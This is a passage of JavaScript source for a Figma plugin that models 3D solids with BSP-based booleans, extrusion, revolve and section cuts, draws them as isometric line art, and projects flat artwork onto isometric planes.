// Isometric Blueprint — Figma plugin main thread.
// Models editable 3D solids (extrude, revolve, push/pull, section cuts,
// booleans) rendered as isometric line art, projects flat artwork onto iso
// planes, and adds blueprint-style hatching, callouts and a figure frame.

figma.showUI(__html__, { width: 900, height: 680, themeColors: true });

// ---------- math ----------

function trig(angleDeg) {
  const a = (angleDeg * Math.PI) / 180;
  return { c: Math.cos(a), s: Math.sin(a) };
}

// World (x, y, z) -> screen. x runs down-right, y down-left, z up.
function iso(x, y, z, t) {
  return { x: (x - y) * t.c, y: (x + y) * t.s - z };
}

// 2x2 matrix mapping a flat (u, v) point onto an isometric plane.
function planeMatrix(plane, t) {
  if (plane === "top") return [t.c, -t.c, t.s, t.s];
  if (plane === "left") return [t.c, 0, t.s, 1];
  if (plane === "right") return [t.c, 0, -t.s, 1];
  throw new Error("Unknown plane " + plane);
}

// ---------- paths ----------
// A path is an array of segments: ['M', x, y] | ['L', x, y] |
// ['Q', x1, y1, x, y] | ['C', x1, y1, x2, y2, x, y] | ['Z'].

function parsePath(data) {
  const tokens = data.match(/[a-zA-Z]|-?(?:\d+\.?\d*|\.\d+)(?:e[-+]?\d+)?/g) || [];
  const segs = [];
  let i = 0;
  let cx = 0;
  let cy = 0;
  let sx = 0;
  let sy = 0;
  const num = () => parseFloat(tokens[i++]);
  while (i < tokens.length) {
    const cmd = tokens[i++].toUpperCase();
    if (cmd === "M" || cmd === "L") {
      cx = num(); cy = num();
      if (cmd === "M") { sx = cx; sy = cy; }
      segs.push([cmd, cx, cy]);
    } else if (cmd === "H") {
      cx = num(); segs.push(["L", cx, cy]);
    } else if (cmd === "V") {
      cy = num(); segs.push(["L", cx, cy]);
    } else if (cmd === "Q") {
      const x1 = num(), y1 = num();
      cx = num(); cy = num();
      segs.push(["Q", x1, y1, cx, cy]);
    } else if (cmd === "C") {
      const x1 = num(), y1 = num(), x2 = num(), y2 = num();
      cx = num(); cy = num();
      segs.push(["C", x1, y1, x2, y2, cx, cy]);
    } else if (cmd === "Z") {
      cx = sx; cy = sy;
      segs.push(["Z"]);
    } else {
      throw new Error("Unsupported path command " + cmd);
    }
  }
  return segs;
}

function mapPath(segs, fn) {
  return segs.map((seg) => {
    const out = [seg[0]];
    for (let k = 1; k < seg.length; k += 2) {
      const p = fn(seg[k], seg[k + 1]);
      out.push(p.x, p.y);
    }
    return out;
  });
}

function pathBounds(paths) {
  let minX = Infinity, minY = Infinity, maxX = -Infinity, maxY = -Infinity;
  for (const segs of paths) {
    for (const seg of segs) {
      for (let k = 1; k < seg.length; k += 2) {
        minX = Math.min(minX, seg[k]); maxX = Math.max(maxX, seg[k]);
        minY = Math.min(minY, seg[k + 1]); maxY = Math.max(maxY, seg[k + 1]);
      }
    }
  }
  return { minX, minY, maxX, maxY };
}

function pathToData(segs) {
  const r = (n) => +n.toFixed(3);
  return segs.map((seg) => seg[0] + (seg.length > 1 ? " " + seg.slice(1).map(r).join(" ") : "")).join(" ");
}

// Writes paths (in parent coordinates) into a vector so it sits exactly there.
function setVectorPaths(vec, paths, windingRules) {
  const b = pathBounds(paths);
  vec.vectorPaths = paths.map((segs, i) => ({
    windingRule: (windingRules && windingRules[i]) || "NONZERO",
    data: pathToData(mapPath(segs, (x, y) => ({ x: x - b.minX, y: y - b.minY }))),
  }));
  vec.relativeTransform = [[1, 0, b.minX], [0, 1, b.minY]];
}

function makeVector(parent, name, paths, style) {
  const vec = figma.createVector();
  parent.appendChild(vec);
  vec.name = name;
  setVectorPaths(vec, paths);
  vec.fills = style.fill ? [solid(style.fill)] : [];
  vec.strokes = style.stroke ? [solid(style.stroke)] : [];
  vec.strokeWeight = style.strokeWeight || 1;
  vec.strokeJoin = "ROUND";
  vec.strokeCap = "ROUND";
  return vec;
}

// ---------- colour ----------

function hexToRgb(hex) {
  const h = hex.replace("#", "");
  const full = h.length === 3 ? h.split("").map((ch) => ch + ch).join("") : h;
  const n = parseInt(full, 16);
  return { r: ((n >> 16) & 255) / 255, g: ((n >> 8) & 255) / 255, b: (n & 255) / 255 };
}

function mix(a, b, t) {
  return { r: a.r + (b.r - a.r) * t, g: a.g + (b.g - a.g) * t, b: a.b + (b.b - a.b) * t };
}

function solid(color, opacity) {
  return { type: "SOLID", color, opacity: opacity === undefined ? 1 : opacity };
}

function palette(msg) {
  const stroke = hexToRgb(msg.stroke || "#2D55E8");
  const fill = hexToRgb(msg.fill || "#FFFFFF");
  return {
    stroke,
    strokeWeight: Number(msg.strokeWeight) || 1.25,
    top: fill,
    left: mix(fill, stroke, 0.06),
    right: mix(fill, stroke, 0.14),
    accent: mix(fill, stroke, 0.45),
  };
}

// ---------- helpers ----------

function viewportCenter() {
  const c = figma.viewport.center;
  return { x: Math.round(c.x), y: Math.round(c.y) };
}

function selection() {
  const sel = figma.currentPage.selection;
  if (!sel.length) throw new Error("Select at least one layer first.");
  return sel;
}

// New shapes go into the selected frame (if any), centred in the viewport.
function insertionTarget() {
  const sel = figma.currentPage.selection;
  const parent = sel.length === 1 && sel[0].type === "FRAME" ? sel[0] : figma.currentPage;
  const c = viewportCenter();
  return { parent, center: absToLocal(parent, c.x, c.y) };
}

function absToLocal(container, x, y) {
  if (container.type === "PAGE") return { x, y };
  const m = container.absoluteTransform;
  return { x: x - m[0][2], y: y - m[1][2] };
}

const fontCache = {};
async function monoFont() {
  if (fontCache.font) return fontCache.font;
  const candidates = [
    { family: "Roboto Mono", style: "Regular" },
    { family: "IBM Plex Mono", style: "Regular" },
    { family: "Inter", style: "Regular" },
  ];
  for (const f of candidates) {
    try {
      await figma.loadFontAsync(f);
      fontCache.font = f;
      return f;
    } catch (e) {
      // try the next font
    }
  }
  throw new Error("Could not load a font.");
}

async function makeText(parent, chars, color, size) {
  const t = figma.createText();
  parent.appendChild(t);
  t.fontName = await monoFont();
  t.fontSize = size || 11;
  t.letterSpacing = { unit: "PERCENT", value: 6 };
  t.characters = chars;
  t.fills = [solid(color)];
  return t;
}

// ---------- project selection onto an iso plane ----------

const CONTAINER_TYPES = ["FRAME", "COMPONENT", "COMPONENT_SET", "INSTANCE", "SECTION"];

function projectLeaf(node, m, origin) {
  const vec = node.type === "VECTOR" ? node : figma.flatten([node], node.parent, node.parent.children.indexOf(node));
  const rt = vec.relativeTransform;
  const toParent = (x, y) => ({
    x: rt[0][0] * x + rt[0][1] * y + rt[0][2],
    y: rt[1][0] * x + rt[1][1] * y + rt[1][2],
  });
  const project = (x, y) => {
    const p = toParent(x, y);
    const u = p.x - origin.x;
    const v = p.y - origin.y;
    return { x: origin.x + m[0] * u + m[1] * v, y: origin.y + m[2] * u + m[3] * v };
  };
  const src = vec.vectorPaths;
  const paths = src.map((p) => mapPath(parsePath(p.data), project));
  setVectorPaths(vec, paths, src.map((p) => p.windingRule));
  return vec;
}

function projectNode(node, m, origin, out) {
  if (node.type === "GROUP") {
    for (const child of node.children.slice()) projectNode(child, m, origin, out);
    return;
  }
  if (CONTAINER_TYPES.indexOf(node.type) !== -1) {
    throw new Error(`"${node.name}" is a ${node.type.toLowerCase()} — group its layers (⌘G) and project the group instead.`);
  }
  out.push(projectLeaf(node, m, origin));
}

function cmdProject(msg) {
  const m = planeMatrix(msg.plane, trig(msg.angle));
  const selected = [];
  for (const original of selection()) {
    let node = original;
    if (msg.keep) {
      node = original.clone();
      original.parent.insertChild(original.parent.children.indexOf(original) + 1, node);
      node.name = original.name + " / " + msg.plane;
    }
    const origin = { x: node.x, y: node.y };
    const leaves = [];
    projectNode(node, m, origin, leaves);
    if (node.type === "GROUP" && !node.removed) selected.push(node);
    else selected.push.apply(selected, leaves);
  }
  figma.currentPage.selection = selected;
  return `Projected onto the ${msg.plane} plane.`;
}

// ---------- 3D solids ----------
// A solid is a Figma group whose plugin data holds a history of operations
// (create → push/pull → cut → merge …). Every change re-evaluates the history
// with constructive solid geometry and redraws it as isometric line art.

const SOLID_KEY = "solid";
const FACE_KEY = "face";

// vec3 helpers (plain [x, y, z] arrays)
const v3 = {
  add: (a, b) => [a[0] + b[0], a[1] + b[1], a[2] + b[2]],
  sub: (a, b) => [a[0] - b[0], a[1] - b[1], a[2] - b[2]],
  scale: (a, k) => [a[0] * k, a[1] * k, a[2] * k],
  dot: (a, b) => a[0] * b[0] + a[1] * b[1] + a[2] * b[2],
  cross: (a, b) => [a[1] * b[2] - a[2] * b[1], a[2] * b[0] - a[0] * b[2], a[0] * b[1] - a[1] * b[0]],
  len: (a) => Math.sqrt(a[0] * a[0] + a[1] * a[1] + a[2] * a[2]),
  lerp: (a, b, t) => [a[0] + (b[0] - a[0]) * t, a[1] + (b[1] - a[1]) * t, a[2] + (b[2] - a[2]) * t],
};
v3.norm = (a) => {
  const l = v3.len(a);
  return l > 0 ? v3.scale(a, 1 / l) : [0, 0, 0];
};

// ---- polygons ----
// { v: [[x,y,z]…], n: [nx,ny,nz], w: plane offset, kind: "solid" | "cut", flags?: [bool…] }

const PLANE_EPS = 1e-4;

function makePoly(verts, kind) {
  // Newell's method: robust normal for any planar polygon.
  let nx = 0, ny = 0, nz = 0, cx = 0, cy = 0, cz = 0;
  for (let i = 0; i < verts.length; i++) {
    const a = verts[i], b = verts[(i + 1) % verts.length];
    nx += (a[1] - b[1]) * (a[2] + b[2]);
    ny += (a[2] - b[2]) * (a[0] + b[0]);
    nz += (a[0] - b[0]) * (a[1] + b[1]);
    cx += a[0]; cy += a[1]; cz += a[2];
  }
  const l = Math.sqrt(nx * nx + ny * ny + nz * nz);
  if (l < 1e-9) return null; // degenerate
  const n = [nx / l, ny / l, nz / l];
  const k = verts.length;
  return { v: verts, n, w: v3.dot(n, [cx / k, cy / k, cz / k]), kind };
}

function clonePoly(p) {
  return { v: p.v.slice(), n: p.n, w: p.w, kind: p.kind, flags: p.flags };
}

function flipPoly(p) {
  p.v.reverse();
  p.n = v3.scale(p.n, -1);
  p.w = -p.w;
}

function translatePolys(polys, t) {
  return polys.map((p) => ({ v: p.v.map((q) => v3.add(q, t)), n: p.n, w: p.w + v3.dot(p.n, t), kind: p.kind }));
}

const COPLANAR = 0, FRONT = 1, BACK = 2, SPANNING = 3;

// Splits `poly` by plane (n, w). Edge flags (used when rendering) follow the
// pieces of the original edges; new edges along the split line get `false`.
function splitPolygon(n, w, poly, coFront, coBack, front, back) {
  let polyType = 0;
  const types = [];
  for (const v of poly.v) {
    const t = v3.dot(n, v) - w;
    const type = t < -PLANE_EPS ? BACK : t > PLANE_EPS ? FRONT : COPLANAR;
    polyType |= type;
    types.push(type);
  }
  if (polyType === COPLANAR) (v3.dot(n, poly.n) > 0 ? coFront : coBack).push(poly);
  else if (polyType === FRONT) front.push(poly);
  else if (polyType === BACK) back.push(poly);
  else {
    const f = [], b = [], ff = [], bf = [];
    const m = poly.v.length;
    for (let i = 0; i < m; i++) {
      const j = (i + 1) % m;
      const ti = types[i], tj = types[j], vi = poly.v[i], vj = poly.v[j];
      const fl = poly.flags ? poly.flags[i] : false;
      if (ti !== BACK) { f.push(vi); ff.push(tj !== BACK || ti === FRONT ? fl : false); }
      if (ti !== FRONT) { b.push(vi); bf.push(tj !== FRONT || ti === BACK ? fl : false); }
      if ((ti | tj) === SPANNING) {
        const t = (w - v3.dot(n, vi)) / v3.dot(n, v3.sub(vj, vi));
        const v = v3.lerp(vi, vj, t);
        f.push(v); ff.push(ti === BACK ? fl : false);
        b.push(v); bf.push(ti === FRONT ? fl : false);
      }
    }
    if (f.length >= 3) front.push({ v: f, n: poly.n, w: poly.w, kind: poly.kind, flags: poly.flags ? ff : undefined, src: poly.src });
    if (b.length >= 3) back.push({ v: b, n: poly.n, w: poly.w, kind: poly.kind, flags: poly.flags ? bf : undefined, src: poly.src });
  }
}

// BSP tree. All walks are iterative so deep trees can't overflow the stack.
class BSP {
  constructor(polys) {
    this.n = null;
    this.w = 0;
    this.front = null;
    this.back = null;
    this.polys = [];
    if (polys) this.build(polys);
  }

  nodes() {
    const out = [];
    const stack = [this];
    while (stack.length) {
      const node = stack.pop();
      out.push(node);
      if (node.front) stack.push(node.front);
      if (node.back) stack.push(node.back);
    }
    return out;
  }

  build(polys) {
    const stack = [[this, polys]];
    let work = 0;
    while (stack.length) {
      const [node, ps] = stack.pop();
      if (!ps.length) continue;
      if ((work += ps.length) > 2e6) throw new Error("This shape is too complex to draw — try fewer segments or loop cuts.");
      let start = 0;
      if (node.n === null) {
        // The polygon that defines the plane always lives on it, even if
        // rounding would classify it otherwise — this guarantees progress.
        node.n = ps[0].n;
        node.w = ps[0].w;
        node.polys.push(ps[0]);
        start = 1;
      }
      const f = [], b = [];
      for (let i = start; i < ps.length; i++) splitPolygon(node.n, node.w, ps[i], node.polys, node.polys, f, b);
      if (f.length) stack.push([node.front || (node.front = new BSP()), f]);
      if (b.length) stack.push([node.back || (node.back = new BSP()), b]);
    }
  }

  invert() {
    for (const node of this.nodes()) {
      for (const p of node.polys) flipPoly(p);
      if (node.n) { node.n = v3.scale(node.n, -1); node.w = -node.w; }
      const t = node.front; node.front = node.back; node.back = t;
    }
  }

  // Removes the parts of `polys` that are inside this solid.
  clipPolygons(polys) {
    const out = [];
    const stack = [[this, polys]];
    while (stack.length) {
      const [node, ps] = stack.pop();
      if (node.n === null) { out.push.apply(out, ps); continue; }
      const f = [], b = [];
      for (const p of ps) splitPolygon(node.n, node.w, p, f, b, f, b);
      if (f.length) { if (node.front) stack.push([node.front, f]); else out.push.apply(out, f); }
      if (b.length && node.back) stack.push([node.back, b]);
    }
    return out;
  }

  clipTo(other) {
    for (const node of this.nodes()) node.polys = other.clipPolygons(node.polys);
  }

  all() {
    const out = [];
    for (const node of this.nodes()) out.push.apply(out, node.polys);
    return out;
  }
}

// Solids whose bounding boxes don't touch can't interact: skip the BSP work.
function disjoint(a, b) {
  const A = bounds3(a), B = bounds3(b), e = 1e-3;
  for (let k = 0; k < 3; k++) if (A.max[k] < B.min[k] - e || B.max[k] < A.min[k] - e) return true;
  return false;
}

function csgUnion(a, b) {
  if (!a.length) return b.slice();
  if (!b.length) return a.slice();
  if (disjoint(a, b)) return a.concat(b);
  const A = new BSP(a.map(clonePoly)), B = new BSP(b.map(clonePoly));
  A.clipTo(B); B.clipTo(A); B.invert(); B.clipTo(A); B.invert();
  A.build(B.all());
  return A.all();
}

function csgSubtract(a, b) {
  if (!a.length || !b.length) return a.slice();
  if (disjoint(a, b)) return a.slice();
  const A = new BSP(a.map(clonePoly)), B = new BSP(b.map(clonePoly));
  A.invert(); A.clipTo(B); B.clipTo(A); B.invert(); B.clipTo(A); B.invert();
  A.build(B.all()); A.invert();
  return A.all();
}

// ---- 2D helpers ----

function area2(pts) {
  let a = 0;
  for (let i = 0; i < pts.length; i++) {
    const p = pts[i], q = pts[(i + 1) % pts.length];
    a += p[0] * q[1] - q[0] * p[1];
  }
  return a / 2;
}

function pointInPoly2(pt, poly) {
  let inside = false;
  for (let i = 0, j = poly.length - 1; i < poly.length; j = i++) {
    const a = poly[i], b = poly[j];
    if ((a[1] > pt[1]) !== (b[1] > pt[1]) && pt[0] < ((b[0] - a[0]) * (pt[1] - a[1])) / (b[1] - a[1]) + a[0]) inside = !inside;
  }
  return inside;
}

function cleanLoop(pts) {
  const out = [];
  for (const p of pts) {
    const last = out[out.length - 1];
    if (!last || Math.abs(last[0] - p[0]) > 1e-6 || Math.abs(last[1] - p[1]) > 1e-6) out.push(p);
  }
  while (out.length > 1 && Math.abs(out[0][0] - out[out.length - 1][0]) < 1e-6 && Math.abs(out[0][1] - out[out.length - 1][1]) < 1e-6) out.pop();
  // drop collinear points
  for (let i = out.length - 1; out.length > 3 && i >= 0; i--) {
    const a = out[(i - 1 + out.length) % out.length], b = out[i], c = out[(i + 1) % out.length];
    if (Math.abs((b[0] - a[0]) * (c[1] - a[1]) - (b[1] - a[1]) * (c[0] - a[0])) < 1e-9) out.splice(i, 1);
  }
  return out;
}

// Ear clipping. `pts` must be counter-clockwise; returns index triples.
function triangulate(pts) {
  const idx = pts.map((_, i) => i);
  const tris = [];
  const cross = (a, b, c) => (b[0] - a[0]) * (c[1] - a[1]) - (b[1] - a[1]) * (c[0] - a[0]);
  let guard = 0;
  while (idx.length > 3 && guard++ < 100000) {
    let clipped = false;
    for (let k = 0; k < idx.length; k++) {
      const i0 = idx[(k - 1 + idx.length) % idx.length], i1 = idx[k], i2 = idx[(k + 1) % idx.length];
      const a = pts[i0], b = pts[i1], c = pts[i2];
      if (cross(a, b, c) <= 1e-12) continue;
      let ear = true;
      for (const j of idx) {
        if (j === i0 || j === i1 || j === i2) continue;
        const p = pts[j];
        if (cross(a, b, p) > 0 && cross(b, c, p) > 0 && cross(c, a, p) > 0) { ear = false; break; }
      }
      if (!ear) continue;
      tris.push([i0, i1, i2]);
      idx.splice(k, 1);
      clipped = true;
      break;
    }
    if (!clipped) { tris.push([idx[0], idx[1], idx[2]]); idx.splice(1, 1); }
  }
  if (idx.length === 3) tris.push(idx.slice());
  return tris;
}

function isConvex2(pts) {
  for (let i = 0; i < pts.length; i++) {
    const a = pts[i], b = pts[(i + 1) % pts.length], c = pts[(i + 2) % pts.length];
    if ((b[0] - a[0]) * (c[1] - a[1]) - (b[1] - a[1]) * (c[0] - a[0]) < -1e-9) return false;
  }
  return true;
}

// Splits loops into outer boundaries and holes (even-odd nesting).
function nestLoops(loops) {
  const outers = [], holes = [];
  loops.forEach((loop, i) => {
    let depth = 0;
    loops.forEach((other, j) => { if (i !== j && pointInPoly2(loop[0], other)) depth++; });
    (depth % 2 ? holes : outers).push(loop);
  });
  return { outers, holes };
}

// ---- primitives ----

// Cap polygons for a planar loop given as 2D pts plus a 2D→3D mapping.
// Output keeps the loop's winding.
function capPolys(pts2, to3, kind) {
  const ccw = area2(pts2) > 0;
  const pts = ccw ? pts2 : pts2.slice().reverse();
  let tris;
  if (isConvex2(pts)) tris = [pts.map((_, i) => i)];
  else tris = triangulate(pts);
  const out = [];
  for (const t of tris) {
    const verts = t.map((i) => to3(pts[i]));
    if (!ccw) verts.reverse();
    const p = makePoly(verts, kind);
    if (p) out.push(p);
  }
  return out;
}

// Prism: a 2D loop placed in 3D by `to3`, swept along vector D.
function prism(loop2, to3, D, kind) {
  let pts = cleanLoop(loop2);
  if (pts.length < 3) return [];
  // Orient so the base cap faces away from D.
  const probe = makePoly(pts.map(to3), kind);
  if (!probe) return [];
  if (v3.dot(probe.n, D) > 0) pts = pts.slice().reverse();
  const base = pts.map(to3);
  const polys = capPolys(pts, to3, kind);
  const topTo3 = (p) => v3.add(to3(p), D);
  for (const p of capPolys(pts.slice().reverse(), topTo3, kind)) polys.push(p);
  for (let i = 0; i < base.length; i++) {
    const a = base[i], b = base[(i + 1) % base.length];
    const p = makePoly([b, a, v3.add(a, D), v3.add(b, D)], kind);
    if (p) polys.push(p);
  }
  return polys;
}

// Prisms for a set of loops with holes: outers minus holes.
function extrudeLoops(loops2, to3, D, kind) {
  const { outers, holes } = nestLoops(loops2.map(cleanLoop).filter((l) => l.length >= 3));
  let mesh = [];
  for (const o of outers) mesh = csgUnion(mesh, prism(o, to3, D, kind));
  if (holes.length) {
    // Holes overshoot both caps so the subtraction is clean.
    const dn = v3.norm(D);
    const pad = v3.scale(dn, 0.5);
    const holeTo3 = (p) => v3.sub(to3(p), pad);
    const HD = v3.add(D, v3.scale(dn, 1));
    for (const h of holes) mesh = csgSubtract(mesh, prism(h, holeTo3, HD, kind));
  }
  return mesh;
}

function boxPolys(min, max, kind) {
  const loop = [[min[0], min[1]], [max[0], min[1]], [max[0], max[1]], [min[0], max[1]]];
  return prism(loop, (p) => [p[0], p[1], min[2]], [0, 0, max[2] - min[2]], kind);
}

// Lathe: profile loop in (r, z) spun around the z axis.
function revolve(loop2, segments, kind) {
  let pts = cleanLoop(loop2.map((p) => [Math.max(0, p[0]), p[1]]));
  if (pts.length < 3) return [];
  if (area2(pts) < 0) pts = pts.slice().reverse();
  const segs = Math.max(6, Math.round(segments));
  const P = (p, a) => [p[0] * Math.cos(a), p[0] * Math.sin(a), p[1]];
  const polys = [];
  for (let j = 0; j < segs; j++) {
    const a0 = (j / segs) * Math.PI * 2, a1 = ((j + 1) / segs) * Math.PI * 2;
    for (let i = 0; i < pts.length; i++) {
      const p = pts[i], q = pts[(i + 1) % pts.length];
      const quad = [P(p, a0), P(p, a1), P(q, a1), P(q, a0)];
      const verts = [];
      for (const v of quad) {
        const last = verts[verts.length - 1];
        if (!last || v3.len(v3.sub(last, v)) > 1e-6) verts.push(v);
      }
      if (verts.length > 2 && v3.len(v3.sub(verts[0], verts[verts.length - 1])) < 1e-6) verts.pop();
      if (verts.length < 3) continue;
      const poly = makePoly(verts, kind);
      if (poly) polys.push(poly);
    }
  }
  return polys;
}

// ---- operations ----

const AXES = { x: 0, y: 1, z: 2 };
const FACE_AXIS = { top: "z", left: "y", right: "x" };
const AXIS_FACE = { z: "top", y: "left", x: "right" };

// 2D in-plane coords <-> 3D for a plane perpendicular to `axis` at `at`.
function planeTo3(axis, at) {
  if (axis === "z") return (p) => [p[0], p[1], at];
  if (axis === "y") return (p) => [p[0], at, p[1]];
  return (p) => [at, p[0], p[1]];
}

function planeTo2(axis, v) {
  if (axis === "z") return [v[0], v[1]];
  if (axis === "y") return [v[0], v[2]];
  return [v[1], v[2]];
}

// Flat drawing (u right, v down) -> 3D for a profile drawn on an iso face.
function profileTo3(plane) {
  if (plane === "top") return (p) => [p[0], p[1], 0];
  if (plane === "left") return (p) => [p[0], 0, -p[1]];
  return (p) => [0, -p[0], -p[1]];
}

function extrudeDir(plane, depth) {
  if (plane === "top") return [0, 0, depth];
  if (plane === "left") return [0, -depth, 0];
  return [-depth, 0, 0];
}

function bounds3(polys) {
  const min = [Infinity, Infinity, Infinity], max = [-Infinity, -Infinity, -Infinity];
  for (const p of polys) for (const v of p.v) for (let k = 0; k < 3; k++) {
    if (v[k] < min[k]) min[k] = v[k];
    if (v[k] > max[k]) max[k] = v[k];
  }
  return { min, max };
}

function num(v, fallback) {
  const n = Number(v);
  return isFinite(n) ? n : fallback;
}

// Prism over an arbitrary convex 3D polygon, swept along D.
function prism3(verts, D, kind) {
  let base = verts;
  const probe = makePoly(base, kind);
  if (!probe) return [];
  if (v3.dot(probe.n, D) > 0) base = base.slice().reverse();
  const polys = [];
  const add = (vs) => { const p = makePoly(vs, kind); if (p) polys.push(p); };
  add(base);
  add(base.map((v) => v3.add(v, D)).reverse());
  for (let i = 0; i < base.length; i++) {
    const a = base[i], b = base[(i + 1) % base.length];
    add([b, a, v3.add(a, D), v3.add(b, D)]);
  }
  return polys;
}

const FACE_DIR = { top: [0, 0, 1], left: [0, 1, 0], right: [1, 0, 0] };

// Loop cut: split every face at evenly spaced planes across `axis`, then
// optionally scale each ring (ends included) to taper the solid between them.
function loopCut(op, mesh, ctx) {
  if (!mesh.length) return mesh;
  const k = AXES[op.axis] !== undefined ? AXES[op.axis] : 2;
  const b = bounds3(mesh);
  const lo = b.min[k], hi = b.max[k];
  const n = Math.max(1, Math.min(24, Math.round(num(op.count, 1))));
  const spacing = (hi - lo) / (n + 1);
  const off = (Math.max(-100, Math.min(100, num(op.slide, 0))) / 100) * spacing * 0.95;
  const loops = [];
  for (let i = 1; i <= n; i++) loops.push(lo + i * spacing + off);
  const knots = [lo].concat(loops, [hi]);

  let polys = mesh;
  for (const t of loops) {
    const nrm = [0, 0, 0];
    nrm[k] = 1;
    const next = [];
    for (const p of polys) splitPolygon(nrm, t, p, next, next, next, next);
    polys = next;
  }

  const scales = knots.map((_, j) => Math.max(0.01, num(op.scales && op.scales[j], 100) / 100));
  if (scales.some((sc) => Math.abs(sc - 1) > 1e-9)) {
    const c = [(b.min[0] + b.max[0]) / 2, (b.min[1] + b.max[1]) / 2, (b.min[2] + b.max[2]) / 2];
    const scaleAt = (t) => {
      if (t <= knots[0]) return scales[0];
      for (let j = 0; j < knots.length - 1; j++) {
        if (t <= knots[j + 1] + 1e-9) {
          const span = knots[j + 1] - knots[j];
          const u = span > 1e-9 ? (t - knots[j]) / span : 0;
          return scales[j] + (scales[j + 1] - scales[j]) * u;
        }
      }
      return scales[scales.length - 1];
    };
    const warp = (v) => {
      const sc = scaleAt(v[k]);
      return v.map((x, i) => (i === k ? x : c[i] + (x - c[i]) * sc));
    };
    polys = polys.map((p) => makePoly(p.v.map(warp), p.kind)).filter(Boolean);
  }

  if (ctx) {
    ctx.loops.push({ k, ts: loops });
    if (op.id) ctx.loopSets[op.id] = { k, knots };
  }
  return polys;
}

// Extrude (or push in) the faces of one loop segment that point at `face`.
function segmentPush(op, mesh, ctx) {
  const L = ctx && ctx.loopSets[op.loopId];
  const dir = FACE_DIR[op.face];
  const depth = num(op.depth, 0);
  if (!L || !dir || !depth) return mesh;
  const seg = Math.max(0, Math.min(L.knots.length - 2, Math.round(num(op.segment, 0))));
  const lo = L.knots[seg], hi = L.knots[seg + 1];
  const along = Math.abs(dir[L.k]) < 0.5; // face runs across the loops
  let tool = [];
  for (const p of mesh) {
    if (v3.dot(p.n, dir) < 0.7 || p.kind === "cut") continue;
    if (along) {
      const c = p.v.reduce((m, v) => m + v[L.k], 0) / p.v.length;
      if (c < lo - 1e-6 || c > hi + 1e-6) continue;
    }
    const piece = depth > 0
      ? prism3(p.v.map((v) => v3.sub(v, v3.scale(p.n, 0.01))), v3.scale(p.n, depth + 0.01), "solid")
      : prism3(p.v.map((v) => v3.add(v, v3.scale(p.n, 0.5))), v3.scale(p.n, depth - 0.5), "solid");
    tool = csgUnion(tool, piece);
  }
  if (!tool.length) return mesh;
  return depth > 0 ? csgUnion(mesh, tool) : csgSubtract(mesh, tool);
}

// Extrude (or push in) one face picked on the canvas: every piece of the
// mesh lying on that plane, inside the same loop-cut strip.
function facePush(op, mesh) {
  const n = op.n, depth = num(op.depth, 0);
  if (!n || !depth) return mesh;
  let tool = [];
  for (const p of mesh) {
    if (p.kind === "cut" || v3.dot(p.n, n) < 1 - 1e-4 || Math.abs(p.w - num(op.w, 0)) > 0.05) continue;
    const c = v3.scale(p.v.reduce((a, b) => v3.add(a, b), [0, 0, 0]), 1 / p.v.length);
    if (!(op.bounds || []).every(([k, lo, hi]) => (lo === null || c[k] >= lo - 1e-3) && (hi === null || c[k] <= hi + 1e-3))) continue;
    const piece = depth > 0
      ? prism3(p.v.map((v) => v3.sub(v, v3.scale(p.n, 0.01))), v3.scale(p.n, depth + 0.01), "solid")
      : prism3(p.v.map((v) => v3.add(v, v3.scale(p.n, 0.5))), v3.scale(p.n, depth - 0.5), "solid");
    tool = csgUnion(tool, piece);
  }
  if (!tool.length) return mesh;
  return depth > 0 ? csgUnion(mesh, tool) : csgSubtract(mesh, tool);
}

function opMesh(op, mesh, ctx) {
  switch (op.type) {
    case "box":
      return csgUnion(mesh, boxPolys([0, 0, 0], [num(op.w, 1), num(op.d, 1), num(op.h, 1)], "solid"));
    case "cylinder": {
      const r = num(op.r, 1), h = num(op.h, 1);
      return csgUnion(mesh, revolve([[0, 0], [r, 0], [r, h], [0, h]], num(op.segments, 48), "solid"));
    }
    case "extrude":
      return csgUnion(mesh, extrudeLoops(op.loops, profileTo3(op.plane), extrudeDir(op.plane, num(op.depth, 1)), "solid"));
    case "revolve": {
      const axis = num(op.axis, 0);
      let out = mesh;
      for (const loop of op.loops) out = csgUnion(out, revolve(loop.map((p) => [p[0] + axis, p[1]]), num(op.segments, 48), "solid"));
      return out;
    }
    case "push": {
      const k = AXES[op.axis];
      const dir = [0, 0, 0];
      dir[k] = 1;
      const depth = num(op.depth, 0);
      const at = num(op.at, 0);
      if (op.through || depth < 0) {
        const b = mesh.length ? bounds3(mesh) : null;
        const reach = op.through && b ? at - b.min[k] + 1 : -depth;
        const start = at + 0.5;
        const tool = extrudeLoops(op.loops, planeTo3(op.axis, start), v3.scale(dir, -(reach + 0.5)), "solid");
        return csgSubtract(mesh, tool);
      }
      if (depth === 0) return mesh;
      // Start slightly inside the face so the union welds cleanly.
      const tool = extrudeLoops(op.loops, planeTo3(op.axis, at - 0.01), v3.scale(dir, depth + 0.01), "solid");
      return csgUnion(mesh, tool);
    }
    case "cut": {
      if (!mesh.length) return mesh;
      const b = bounds3(mesh);
      const pad = 10;
      const at = (k, pct) => b.min[k] + (b.max[k] - b.min[k]) * Math.min(1, Math.max(0, num(pct, 50) / 100));
      const min = [b.min[0] - pad, b.min[1] - pad, b.min[2] - pad];
      const max = [b.max[0] + pad, b.max[1] + pad, b.max[2] + pad];
      if (op.preset === "quarter" || op.preset === "right") min[0] = at(0, op.fx);
      if (op.preset === "quarter" || op.preset === "left") min[1] = at(1, op.fy);
      if (op.preset === "top") min[2] = at(2, op.fz);
      return csgSubtract(mesh, boxPolys(min, max, "cut"));
    }
    case "merge": {
      let other = evaluateOps(op.ops);
      if (op.m) other = transformPolys(other, (v) => matVec(op.m, v), (n) => matVec(op.m, n));
      other = translatePolys(other, [num(op.ox, 0), num(op.oy, 0), num(op.oz, 0)]);
      return op.mode === "subtract" ? csgSubtract(mesh, other) : csgUnion(mesh, other);
    }
    case "sphere": {
      const r = num(op.r, 50), seg = Math.max(8, Math.round(num(op.segments, 32)));
      const n = Math.max(4, Math.round(seg / 2));
      const prof = [[0, 0]];
      for (let i = 1; i < n; i++) prof.push([r * Math.sin((Math.PI * i) / n), r - r * Math.cos((Math.PI * i) / n)]);
      prof.push([0, 2 * r]);
      return csgUnion(mesh, revolve(prof, seg, "solid"));
    }
    case "cone": {
      const r1 = Math.max(0, num(op.r1, 50)), r2 = Math.max(0, num(op.r2, 0)), h = num(op.h, 80);
      const prof = r2 > 0.01 ? [[0, 0], [r1, 0], [r2, h], [0, h]] : [[0, 0], [r1, 0], [0, h]];
      return csgUnion(mesh, revolve(prof, num(op.segments, 40), "solid"));
    }
    case "tube": {
